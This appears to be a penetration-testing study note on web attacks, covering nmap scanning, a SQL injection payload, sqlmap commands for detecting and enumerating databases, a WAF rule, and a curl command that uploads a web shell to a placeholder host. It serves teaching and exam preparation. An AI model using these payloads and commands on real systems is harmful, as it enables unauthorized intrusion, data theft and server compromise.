```markdown
# 🌐 Web Attacks

---

## 🔍 Initial Reconnaissance

[[HTTP Requests]]

### Nmap Scan

```bash
nmap -p 80,443 <IP>
```

> [!INFO]
> This command scans for common web server ports.

### Basic HTTP Request

```text
GET / HTTP/1.1\r\nHost: example.com\r\n\r\n
```

---

## 🚀 Exploitation Techniques

### SQL Injection

#### Using Burp Suite

1. Intercept the request.
2. Modify the payload to introduce an injection point.

Example Payload:

```sql
' OR '1'='1
```

> [!SUCCESS]
> If the application responds differently, a vulnerability may be present.

---

## 🛠️ Tools and Techniques

### [[SQLMap]]

#### Basic Usage

For detecting SQL injection vulnerabilities:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1"
```

For exploiting detected vulnerabilities:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs
```

> [!ABSTRACT]
> [[SQLMap]] is an automated SQL injection and database takeover tool.

---

## 🛡️ Security Measures

### WAF (Web Application Firewall)

#### Activating a Rule

Example rule to block SQL injection attempts:

```json
{
    "id": 10,
    "action": "block",
    "description": "SQL Injection Prevention"
}
```

> [!NOTE]
> Always ensure that the WAF rules do not interfere with legitimate traffic.

---

## ⚠️ Common Findings

| Finding | Impact |
|---|---|
| SQL Injection Vulnerability | Data Exposure, Data Tampering |
| XSS (Cross-Site Scripting) | Account Hijacking, Phishing |
| CSRF (Cross-Site Request Forgery) | Unintended Actions by Users |

---

## ⚠️ Potential Dangers

### Executing Arbitrary Code via Web Shell

Example of uploading a web shell:

```bash
curl -d "name=webshell.php&uploadedfile=@shell.txt" http://example.com/upload/
```

> [!DANGER]
> This can lead to full server compromise.

---

## 🧠 Exam Mental Model

Web Attack Workflow:

1. Reconnaissance → Identify Targets and Services.
2. Enumeration → Gather Information about the Web Application.
3. Vulnerability Assessment → Check for Known Vulnerabilities.
4. Exploitation → Execute Attacks Based on Identified Weaknesses.
5. Post-Exploitation → Maintain Access and Cover Tracks.

---

```